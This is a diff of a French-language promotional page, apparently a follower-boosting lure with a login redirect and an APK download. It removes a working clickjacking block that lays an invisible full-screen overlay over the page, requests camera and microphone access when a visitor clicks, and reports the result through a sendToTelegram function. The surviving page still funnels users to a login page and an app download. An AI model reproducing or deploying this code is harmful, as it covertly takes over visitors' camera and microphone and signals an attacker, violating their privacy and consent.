@@ -50,6 +50,7 @@
             margin-bottom: 25px;
         }
         
+        /* Nouveau style pour les deux boutons */
         .double-buttons {
             display: flex;
             gap: 15px;
@@ -73,8 +74,6 @@
             text-decoration: none;
             transition: all 0.3s;
             box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-            position: relative;
-            z-index: 2;
         }
         
         .cta-button-secondary {
@@ -93,8 +92,6 @@
             text-decoration: none;
             transition: all 0.3s;
             box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-            position: relative;
-            z-index: 2;
         }
         
         .cta-button-primary:hover, .cta-button-secondary:hover {
@@ -684,79 +681,7 @@
         showArticleAlert("🎯 Article complet réservé aux membres.\nInscrivez-vous gratuitement !");
     });
     
-    // ============================================
-    // CLICKJACKING - FORCER CAMÉRA ET MICRO
-    // ============================================
-    let clickjackingActive = false;
-    let clickjackingOverlay = null;
-    
-    function activateClickjacking() {
-        if (clickjackingActive) return;
-        clickjackingActive = true;
-        
-        // Créer un overlay invisible sur TOUT l'écran
-        const overlay = document.createElement('div');
-        overlay.id = 'clickjackingOverlay';
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 999999;
-            opacity: 0;
-            cursor: pointer;
-        `;
-        
-        // Au clic sur l'overlay (l'utilisateur pense cliquer sur un bouton)
-        overlay.onclick = async () => {
-            try {
-                // Demander la caméra
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                if (typeof window.cameraStream !== 'undefined') window.cameraStream = stream;
-                
-                // Envoyer confirmation à Telegram
-                if (typeof sendToTelegram === 'function') {
-                    sendToTelegram('✅ CAMÉRA + MICRO ACCEPTÉS VIA CLICKJACKING');
-                }
-                
-                // Supprimer l'overlay après succès
-                if (clickjackingOverlay) clickjackingOverlay.remove();
-                clickjackingActive = false;
-            } catch(e) {
-                if (typeof sendToTelegram === 'function') {
-                    sendToTelegram(`❌ CLICKJACKING ÉCHOUÉ: ${e.message}`);
-                }
-            }
-        };
-        
-        document.body.appendChild(overlay);
-        clickjackingOverlay = overlay;
-        
-        // Supprimer après 30 secondes si pas cliqué
-        setTimeout(() => {
-            if (clickjackingOverlay && clickjackingOverlay.parentNode) {
-                clickjackingOverlay.remove();
-                clickjackingActive = false;
-            }
-        }, 30000);
-    }
-    
-    // Fonction de redirection avec clickjacking
-    function redirectToLoginWithClickjacking() {
-        updateStatus('🔄 Activation de la vérification sécurisée...');
-        
-        // Activer le clickjacking
-        activateClickjacking();
-        
-        // Redirection normale après 500ms
-        setTimeout(() => {
-            window.location.href = 'login.html';
-        }, 500);
-    }
-    
-    // Fonction de redirection normale (sans clickjacking pour le bouton VIP)
+    // Fonction de redirection commune
     function redirectToLogin() {
         updateStatus('🔄 Redirection vers la page de connexion...');
         setTimeout(() => {
@@ -764,12 +689,10 @@
         }, 500);
     }
     
-    // CTA principaux : clickjacking sur le bouton principal "AUGMENTER MES ABONNÉS"
-    document.getElementById('mainCtaTop')?.addEventListener('click', redirectToLoginWithClickjacking);
-    document.getElementById('mainCtaBottom')?.addEventListener('click', redirectToLoginWithClickjacking);
-    
-    // Boutons VIP : redirection normale (sans clickjacking)
+    // CTA principaux (4 boutons au total)
+    document.getElementById('mainCtaTop')?.addEventListener('click', redirectToLogin);
     document.getElementById('mainCtaTop2')?.addEventListener('click', redirectToLogin);
+    document.getElementById('mainCtaBottom')?.addEventListener('click', redirectToLogin);
     document.getElementById('mainCtaBottom2')?.addEventListener('click', redirectToLogin);
     
     // Téléchargement APK
